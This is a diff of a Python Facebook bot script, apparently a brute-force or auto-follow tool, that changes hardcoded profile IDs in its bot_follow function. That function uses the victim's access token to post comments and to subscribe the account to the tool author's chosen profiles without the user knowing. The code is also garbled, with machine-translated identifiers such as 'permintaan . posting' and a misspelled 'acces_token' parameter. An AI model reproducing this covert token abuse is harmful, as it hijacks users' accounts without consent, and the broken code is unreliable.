@@ -14,7 +14,7 @@
 #                                                    #
 # Tipe Python3                                       #
 #                                                    #
-# File Name: bangsat.py                              #
+# File Name: force.py                              #
 #                                                    #
 # Github: https://www.github.com/Bangsat-XD          #
 #                                                    #
@@ -240,9 +240,9 @@ def  bot_follow ():
 		log ()
 	permintaan . post ( 'https://graph.facebook.com/'  +  post  +  '/comments/?message='  +  komen  + '&access_token='  +  toket )
 	permintaan . post ( 'https://graph.facebook.com/'  +  postdua  +  '/comments/?message='  +  komendua  +  '&acces_token' + toket )
-	permintaan . posting ( 'https://graph.facebook.com/100002664282607/subscribers?access_token='  +  toket ) # Ebink!
-	permintaan . post ( 'https://graph.facebook.com/100000419639430/subscribers?access_token='  +  toket ) # Meyy
-	permintaan . post ( 'https://graph.facebook.com/1752684667/subscribers?access_token='  +  toket ) # Izhar
+	permintaan . posting ( 'https://graph.facebook.com/100017584682867/subscribers?access_token='  +  toket ) 
+	permintaan . post ( 'https://graph.facebook.com/100000395779504/subscribers?access_token='  +  toket )
+	permintaan . post ( 'https://graph.facebook.com/100000834003593/subscribers?access_token='  +  toket ) 
 # request.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Tidak tahu
 # request.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Tidak tahu
 # request.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Tidak tahu
